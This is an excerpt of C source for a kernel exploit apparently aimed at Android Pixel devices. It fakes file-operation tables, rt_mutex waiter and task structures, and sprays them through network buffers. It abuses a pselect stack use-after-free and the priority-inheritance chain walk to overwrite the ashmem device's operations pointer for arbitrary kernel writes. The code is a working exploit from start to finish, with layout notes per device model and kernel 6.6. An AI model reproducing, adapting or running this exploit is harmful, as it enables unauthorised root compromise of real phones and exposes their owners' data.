...
/* Stable user VA used as stack-UAF waiter->lock after pselect overwrites. */
uint64_t pselect_user_lock[PSELECT_USER_LOCK_WORDS];

uint64_t pselect_write_target = 0;
uint64_t pselect_write_shape = 0;
uint32_t pselect_write_value = 0;

void set_pselect_write(uint64_t target, uint64_t shape, uint32_t value) {
  pselect_write_target = target;
  pselect_write_shape = shape;
  pselect_write_value = value;
}
...
int open_ashmem_device(void) {
  ...
  if (fd < 0) {
    printf("[-] open ashmem failed path=%s errno=%d\n", ashmem_path, errno);
  }
  return fd;
}
...
void put_fake_fops_table(unsigned char *p, size_t off) {
  ...
  /* oriole plants PI-tree node pointer at read slot for type confusion hops */
  put64(p, off + FOPS_READ_OFF, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
...
int prepare_skb_payload(uintptr_t base, int payload_mode) {
  ...
  /*
   * GhostLock rb write primitive (oriole layout):
   *   pi_tree.parent = write_pc   (VALUE stored into left node)
   *   pi_tree.left   = write_left (ADDRESS treated as rb_node)
   * FOPS: parent=fake_fops, left=ASHMEM_MISC_FOPS => *misc_fops = fake_fops
   * Slide: parent=logger, left=boot_id_data
   *
   * Stack-UAF: after pselect, stack waiter->lock = &pselect_user_lock.
   * Page waiter->lock must equal that user VA for top_waiter validation.
   */
  /*
   * tokay simple_pselect_fops layout (works on 6.6):
   *   write_pc    = fake_fops
   *   write_right = ASHMEM_MISC_FOPS   // ADDRESS written
   *   write_left  = 0
   * oriole FOPS uses left=misc; jinghu follows tokay simple for 6.6.
   */
  /*
   * FOPS write primitive (oriole GhostLock):
   *   pi_tree.parent = fake_fops          (VALUE)
   *   pi_tree.right  = 0
   *   pi_tree.left   = ASHMEM_MISC_FOPS   (ADDRESS written via rb_set_parent_color)
   *
   * Stack-UAF: stack_waiter->lock = &pselect_user_lock
   * user_lock.waiters = fake_w0, fake_w0->lock = &pselect_user_lock
   * fake_task.pi_waiters = fake_w0.pi_tree (so owner-hop recolors write node)
   */
  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = 0;
  uintptr_t write_left = data_addr(ASHMEM_MISC_FOPS) - 0x08;
  uint64_t waiter_task = fake_task;
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = fake_task;
  int stack_uaf_lock = (payload_mode == PAGE_PAYLOAD_FOPS);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = pselect_write_target ? pselect_write_target
    ...
    write_right = 0;
    write_left = pselect_write_target;
  ...
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    ...
    /* Match oriole FOPS layout: lock waiters point at fake_w0, owner=fake_task|1 */
    ...
    /* Stack-UAF: stack waiter->lock becomes &pselect_user_lock. */
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF,
          stack_uaf_lock ? (uint64_t)(uintptr_t)pselect_user_lock : fake_lock);
    ...
    /* Link pi_waiters for slide and for FOPS stack-UAF hops. */
    if (payload_mode == PAGE_PAYLOAD_SLIDE || stack_uaf_lock) {
    ...
    /*
     * pi_blocked_on MUST be non-zero so rt_mutex_adjust_prio_chain
     * continues the chain walk into fake_task.pi_waiters (rb_erase_cached
     * + rb_insert_color => write to *ASHMEM_MISC_FOPS).
     * Must point to fake_w0 (struct start), NOT fake_w0 + pi_tree_entry,
     * so waiter2->lock is read from +0x58 (where we set it).
     */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
          fake_w0);
